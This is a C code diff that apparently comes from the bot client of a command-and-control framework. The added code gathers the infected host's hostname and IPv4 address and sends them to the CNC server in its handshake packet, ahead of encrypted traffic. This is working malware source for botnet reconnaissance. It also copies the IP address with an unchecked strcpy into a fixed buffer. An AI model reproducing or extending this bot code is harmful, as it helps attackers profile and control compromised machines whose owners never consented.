@@ -21,6 +21,8 @@ PeerPktHandler laikaB_handlerTbl[LAIKAPKT_MAXNONE] = {
 
 struct sLaika_bot *laikaB_newBot(void) {
     struct sLaika_bot *bot = laikaM_malloc(sizeof(struct sLaika_bot));
+    struct hostent *host;
+    char *tempIPBuf;
     size_t _unused;
 
     laikaP_initPList(&bot->pList);
@@ -48,6 +50,24 @@ struct sLaika_bot *laikaB_newBot(void) {
         LAIKA_ERROR("Failed to init cnc public key!\n");
     }
 
+    /* grab hostname & ip info */
+    if (SOCKETERROR(gethostname(bot->peer->hostname, LAIKA_HOSTNAME_LEN))) {
+        laikaB_freeBot(bot);
+        LAIKA_ERROR("gethostname() failed!\n");
+    }
+
+    if ((host = gethostbyname(bot->peer->hostname)) == NULL) {
+        laikaB_freeBot(bot);
+        LAIKA_ERROR("gethostbyname() failed!\n");
+    }
+
+    if ((tempIPBuf = inet_ntoa(*((struct in_addr*)host->h_addr_list[0]))) == NULL) {
+        laikaB_freeBot(bot);
+        LAIKA_ERROR("inet_ntoa() failed!\n");
+    }
+
+    /* copy ipv4 address info */
+    strcpy(bot->peer->ipv4, tempIPBuf);
     return bot;
 }
 
@@ -72,7 +92,9 @@ void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
     laikaS_writeByte(sock, LAIKA_VERSION_MAJOR);
     laikaS_writeByte(sock, LAIKA_VERSION_MINOR);
     laikaS_write(sock, bot->pub, sizeof(bot->pub)); /* write public key */
-    laikaS_endOutPacket(bot->peer); /* force packet body to be plaintext */
+    laikaS_write(sock, bot->peer->hostname, LAIKA_HOSTNAME_LEN);
+    laikaS_write(sock, bot->peer->ipv4, LAIKA_IPV4_LEN);
+    laikaS_endOutPacket(bot->peer);
     laikaS_setSecure(bot->peer, true); /* after the cnc receives our handshake, our packets will be encrypted */
 
     if (crypto_kx_client_session_keys(bot->peer->inKey, bot->peer->outKey, bot->pub, bot->priv, bot->peer->peerPub) != 0)
